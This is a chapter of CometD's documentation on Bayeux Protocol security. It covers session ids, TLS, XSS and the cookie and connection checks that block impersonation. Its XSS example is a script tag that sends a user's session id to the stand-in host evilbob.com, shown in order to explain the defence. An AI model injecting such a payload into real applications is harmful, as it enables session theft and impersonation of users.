
[[_security]]
== Security

This session discusses the security features of the Bayeux Protocol and the
relationship with common attacks and how you can configure CometD to tighten
your application.

=== Security of the session id

The Bayeux Protocol identifies a particular session (formerly known as "client")
via a session id token, carried in Bayeux messages by the `clientId` field.
The `clientId` field value (i.e. the session id) is generated by the server
when the client sends the handshake request message, and sent back to the
client in the handshake response message (see
<<_bayeux_meta_handshake,the Bayeux Protocol handshake>>).
The client then sends the `clientId` field in every subsequent message to the
server, until disconnection.

The session id is generated using a strong random number generator, and as
such it is not guessable by an evil third party.
An evil user that knows its own session id cannot guess the session id of
another user by just looking at its own session id.

While the non-guessability of the session id is a good starting point, it
is typically not enough, so read on.

=== Security against man-in-the-middle attacks

An evil user may be in the position to observe Bayeux Protocol traffic, as
it is the case for a man-in-the-middle.

The typical solution in this case is to encrypt the traffic between the
client and the server using TLS.
In this way, all the traffic between the client and the server is
encrypted end-to-end and a man-in-the-middle cannot look or otherwise retrieve
someone else's session id.

=== Security against cross-site scripting (XSS) attacks

A https://www.owasp.org/index.php/Cross-site_Scripting_%28XSS%29[cross-site scripting attack]
is a particularly important vulnerability of web applications.

A typical example of XSS is the following:

Evil user Bob connects to a chat service that uses CometD.
There, he finds Alice, another user.
Bob sends an evil chat message text to Alice where the text is the following:

====
[source,html]
----
<script type="text/javascript">
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://evilbob.com?stolen=" + $.cometd.getClientId());
xhr.send();
</script>
----
====

As you can see, the script accesses the CometD's session id (via
`$.cometd.getClientId()`).

[NOTE]
====
Removing the method `getClientId()` would not solve the issue, because
the evil script could access the session id in other ways.
For example, by registering an extension, or by otherwise watching
Bayeux messages that come and go for the normal functioning of the
application, or by quickly disconnecting and reconnecting the session, etc.
====

Bob sends that evil message, which reaches the CometD server and gets routed
to Alice. When it arrives on Alice's browser, that script may be run by
the browser if the application is XSS vulnerable.

If the script runs, Bob would be able to steal Alice's session id, send
it to his server `evilbob.com`, where Bob would be able to access it.

[IMPORTANT]
====
If your web application is XSS vulnerable, an attacker can do
a lot more damage than just stealing a CometD session id, so it is of
paramount importance that your web application sanitizes data received
from unknown sources such as other users chat messages.
====

If Bob has stolen Alice's session id, he could craft a Bayeux message
with Alice's session id and send it from his computer, and thereby could
impersonate Alice.

CometD protects from impersonations due to stolen session ids in different
ways, depending on the type of transport used to carry Bayeux messages.

For transports based on HTTP (`long-polling` and `callback-polling`),
CometD sends a HTTP session cookie, marked as `HttpOnly`,
called `BAYEUX_SESSION` (see <<_java_server_configuration>>).
The CometD implementation, on the server, maps this cookie to a legit
session id during the processing of the handshake request message.
For every subsequent message, the browser will send the `BAYEUX_SESSION`
cookie to the server and the CometD implementation will
retrieve the session id from the cookie, rather than from the message
(where it could have been altered).

Bob could craft a message with Alice's session id, but the `BAYEUX_SESSION`
cookie that he will send along with the tampered message will be his,
not Alice's. The CometD implementation will detect this attack and disconnect
Bob. If the cookie is missing, CometD will ask Bob to re-handshake.

For transports based on WebSocket (`websocket`), CometD trusts the particular
connection that has been established during the handshake.
The session id is associated to that connection and when a WebSocket message
arrives on that connection, CometD retrieves the session id from the
association with the connection, rather than from the message (where it
could have been altered).

When the connection is closed, for example for a network failure, CometD
attempts to open another connection.
If the reconnection happens within a short period of time (typically less than
the `maxInterval` configured on the server), then CometD will try to send
messages on the new connection without re-handshaking, but since it's a new
connection that did not process a handshake message, it will not have a
session id associated.

At this point, CometD could ask the client to re-handshake (which involves
some round-trips to be completed, possibly slowing further down the
communication in case of faulty networks), or it could trust the session
id from the message (which would yield faster reconnections, albeit less
secure if the session id is stolen).
This is controlled by the `requireHandshakePerConnection` parameter, see
<<_java_server_configuration>>.
